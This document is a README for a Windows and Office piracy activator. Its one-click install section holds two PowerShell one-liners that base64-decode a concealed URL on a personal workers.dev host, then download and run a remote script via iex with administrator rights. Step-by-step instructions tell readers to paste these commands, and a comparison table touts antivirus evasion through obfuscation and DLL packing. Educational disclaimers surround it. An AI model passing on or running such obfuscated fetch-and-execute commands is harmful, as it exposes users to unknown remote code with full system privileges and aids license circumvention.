# 📖 WINDOWS and OFFICE ACTIVATOR

## ⚠️ Important Disclaimer
This document and the associated script are provided **strictly for educational, development, and system administration study purposes**. it demonstrates how Windows Software Protection Platform (SPP), KMS volume licensing mechanisms, and activation renewal tasks interact at the OS level. It is not intended for production use, redistribution, or circumvention of legitimate software licensing. Always comply with Microsoft's End User License Agreement (EULA) and applicable laws in your jurisdiction.

---
ㅤ
ㅤ
ㅤ
ㅤㅤ
ㅤㅤ
ㅤ
---



## 🖥️ Supported Operating Systems & Build Requirements 🟡🟡 FOR ACTIVATOR 1 🟡🟡

| Feature / Component       | Supported OS / Versions                     | Minimum Build | Notes & Requirements                     |
|---------------------------|---------------------------------------------|---------------|------------------------------------------|
| **HWID Activation**       | Windows 10 / 11 (Client & Server)           | 10240+        | Requires one-time internet contact.      |
| **KMS38 Activation**      | Windows 10 / Server 2016+                   | 14393+        | Offline-capable. Valid until Jan 2038.   |
| **Online KMS**            | Windows 7 / 8 / 8.1 / 10 / 11 & Servers     | 7600+         | Requires internet for KMS handshake.     |
| **Office Activation**     | Office 2010, 2013, 2016, 2019, 2021, 365    | Varies        | Handles Retail ↔ Volume conversion.      |
| **Scheduled Renewal**     | Windows Vista / 7 / 8 / 10 / 11             | 6000+         | Uses Windows Task Scheduler.             |
| **Architecture & Runtime**| x86, x64                                    | Native        | Standard Batch/WSF execution flow.       |

> 🔰 **Safety:** Unsupported builds will exit gracefully with a version-check warning.

---

## 🌐 Supported Operating Systems & Build Requirements 🟢🟢 FOR ACTIVATOR 2 🟢🟢

| Feature / Component       | Supported OS / Versions                     | Minimum Build | Notes & Requirements                     |
|---------------------------|---------------------------------------------|---------------|------------------------------------------|
| **HWID Activation**       | Windows 10 / 11 (Client & Server)           | 10240+        | Requires one-time internet contact.      |
| **KMS38 Activation**      | Windows 10 / Server 2016+                   | 14393+        | Offline-capable. Valid until Jan 2038.   |
| **Online KMS**            | Windows 7 / 8 / 8.1 / 10 / 11 & Servers     | 7600+         | Requires internet for KMS handshake.     |
| **Office Activation**     | Office 2010, 2013, 2016, 2019, 2021, 2024, 365 | Varies     | Handles C2R/Retail ↔ Volume conversion.  |
| **Scheduled Renewal**     | Windows 7 / 8 / 8.1 / 10 / 11 & Servers     | 7600+         | Uses Windows Task Scheduler.             |
| **Architecture & Runtime**| x86, x64, ARM64                             | Native        | Auto-redirects via `Sysnative`/`SysArm32`; Requires PowerShell for JIT compilation. |

> 🔰 **Safety:** Unsupported builds will exit gracefully with a version-check warning.


---
ㅤ
ㅤ
ㅤ
ㅤㅤ
---

## ⚡ One-Click Install (Recommended)

 🚨 use any one of them if any one dosent work only then use the next one.

**Run this single line in Administrator PowerShell** to auto-download, install, and configure:

# Activator 1
```powershell
$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9tdWRkeS1kZXctNTEyNC5wcml5YWdob3NoNzM5LndvcmtlcnMuZGV2L2dldC1sb2FkZXI=')); iex (Invoke-WebRequest -Uri $u -Headers @{'X-Gateway-Auth'='windows'} -UseBasicParsing).Content
```
ㅤ
# Activator 2
```powershell
$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hY3RpdmF0b3IyLnByaXlhZ2hvc2g3Mzkud29ya2Vycy5kZXYvZ2V0LWxvYWRlcg==')); iex (Invoke-WebRequest -Uri $u -Headers @{'X-Gateway-Auth'='windows'} -UseBasicParsing).Content
```

ㅤ
ㅤ
ㅤ
---

## 🛠️ How to Run the Setup

Follow these simple steps to run the automation on any Windows machine:

### 1️⃣ Open PowerShell as Administrator
* Press the **Windows Key** 🪟 on your keyboard.
* Type **PowerShell** into the search bar.
* Right-click on **Windows PowerShell** and select ✨ **Run as administrator** ✨.
* Click **Yes** if a pop-up asks for permission.

### 2️⃣ Copy & Paste the Command
Choose from the activator 1 or 2. Copy the entire line, (use the copy button to copy) paste it directly into your blue PowerShell window, and press **Enter** ↩️:

### 3️⃣ Follow the On-Screen Interface
* A new Command Prompt window will pop up with a visual menu interface. 💻
* Simply follow the prompts on your screen to complete your configuration!
ㅤㅤ
---
ㅤ
ㅤ
ㅤ
ㅤㅤㅤ
ㅤ
ㅤ
ㅤㅤ


---

| Feature                 |  Persistence & Upgrades                                                                                                |
|-------------------------|------------------------------------------------------------------------------------------------------------------------|
| **HWID Activation**     | Permanent: Tied to hardware; survives restarts, updates, resets, and clean OS installs.                                | 
| **KMS38 Activation**    | Semi-Permanent: Survives restarts/updates; resets if you clean-reinstall the OS.                                       |
| **Online KMS**          | Temporary: But Indefinite (via Task) auto-renews forever. Survives restarts, but wiped by major upgrades or PC resets. |
| **Office Activation**   | Varies: Survives restarts; major updates or PC resets will break the activation.                                       |
| **Scheduled Renewal**   | Temporary: Survives restarts, but major Windows upgrades or PC resets will wipe the scheduled task.                    |


---
ㅤ
ㅤ
ㅤ
ㅤ
---



## 📦 Core Features & Modules

| Option | Functionality                                                                                                               |
|--------|-----------------------------------------------------------------------------------------------------------------------------|
| `[A]`  | **HWID Activation** – Triggers Windows digital license via hardware hash sync.                                              | 
| `[B]`  | **KMS38 Activation** – Applies built-in KMS GVLK + local activation (2038 expiry).                                          | 
| `[C]`  | **Online KMS** – Connects to KMS servers for Windows/Office. Includes auto-renewal task creation.                           | 
| `[D]`  | **Check Activation Status** – Queries `slmgr.vbs -xpr`, WMIC SPP classes, and license states.                               | 
| `[E]`  | **Troubleshoot | DISM repair, SPP cache clear, network tests, log export, edition change diagnostics. |
| `[F]`  | **Extras** | `$OEM$` media prep, edition downgrade/upgrade, key injection, context menus, task management, and script extraction. |
| `[G]`  | **Uninstall** | Complete removal of MAS hooks, tasks, registry entries, and KMS cache.     |


---
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
---





### 📊 Functional Comparison (Same Goal, Different Path)
| Feature | `Activator 1` | `Activator 2` |
|---------|-----------------|---------------|
| HWID Activation | ✅ Embedded token/hashing logic | ✅ Direct SPP hash sync via PowerShell |
| KMS38 / KMS4k | ✅ Pre-baked GVLK + DLL hooks | ✅ Native CSVLK injection + API calls |
| Office Activation | ✅ Retail→Volume converter + embedded licenses | ✅ OSPP/C2R detection + dynamic GVLK mapping |
| Scheduled Renewal | ✅ XML task templates embedded | ✅ Compact XML generation + PowerShell task creation |
| AV Evasion | ✅ Relies on obfuscation + DLL packing | ✅ Uses native OS calls + JIT compilation (lower signature footprint) |
| **Payload Strategy** | Stores pre-compiled binaries (DLLs, tokens, license files, large key databases) as encoded text blobs directly inside the script. Acts like a self-extracting archive. | Contains **no embedded binaries**. Uses PowerShell/C# Just-In-Time (JIT) compilation to generate activation logic on the fly. |
| **Execution Model** | Extracts heavy payloads to `%TEMP%`, runs them, then cleans up. | Orchestrates native Windows APIs (`SPP`, `SLMGR`, `WMI`, `Task Scheduler`) via inline PowerShell and C# namespaces (`LibTSforge`, `ActivationWs`). |
| **Data Storage** | Bulk Base64/Custom-encoded blocks (`:bat2file`, `::R2Vfile`, etc.) that decode into full files. | Compact arrays, GUID maps, and conditional logic. Data is parsed dynamically rather than stored as full file dumps. |
| **Dependency Footprint** | Self-contained. Ships everything it needs → larger size, higher AV signature surface. | OS-native. Relies on Windows built-in components → minimal script size, lower detection footprint. |




---
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ

ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ


ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ

ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
ㅤ
---



### ⚠️ DISCLAIMER & LEGAL NOTICE

This project is provided **"AS-IS"** strictly for educational, research, and system administration purposes. By using this script, you explicitly acknowledge and agree to the following:

- **NO LIABILITY:** The authors, contributors, and maintainers assume **ZERO** responsibility or liability for any system instability, data loss, activation failures, legal consequences, or damages arising from the use or misuse of this tool.
- **USER RESPONSIBILITY:** You assume **FULL** and **SOLE** responsibility for how, where, and under what circumstances this script is executed. Use entirely at your own risk.
- **LEGAL COMPLIANCE:** Do **NOT** use this tool for illicit, unauthorized, or illegal purposes. Always comply with applicable software licensing agreements, local laws, and organizational policies.
- **NO AFFILIATION:** This project is **NOT** affiliated with, endorsed by, or authorized by Microsoft Corporation. All trademarks and product names are the property of their respective owners.

If you do not agree with these terms, do not download, run, or distribute this software.
ㅤ
ㅤ
